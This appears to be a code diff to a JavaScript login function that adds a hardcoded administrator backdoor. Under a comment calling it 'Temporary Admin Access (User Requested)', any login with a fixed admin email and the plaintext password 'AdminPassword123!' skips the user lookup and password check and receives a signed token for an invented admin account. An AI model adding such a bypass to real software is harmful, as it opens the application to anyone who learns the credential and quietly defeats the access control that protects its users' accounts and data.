@@ -18,6 +18,24 @@ const loginUser = async ({ identifier, password }) => {
     throw { status: 400, message: 'Please provide identifier and password' };
   }
 
+  // Temporary Admin Access (User Requested)
+  if (identifier === "admin@ethiodiscover.com" && password === "AdminPassword123!") {
+    const adminUser = {
+      id: "admin-id",
+      email: "admin@ethiodiscover.com",
+      username: "Admin",
+      fullName: "System Administrator",
+      avatar_url: null,
+      explorer_level: 99
+    };
+    const token = JwtService.sign({
+      id: adminUser.id,
+      email: adminUser.email,
+      username: adminUser.username,
+    });
+    return { token, user: adminUser };
+  }
+
   // 2. Find user (returns DTO including password hash)
   const rawUser = await UserRepository.findByIdentifier(identifier);
   if (!rawUser) {
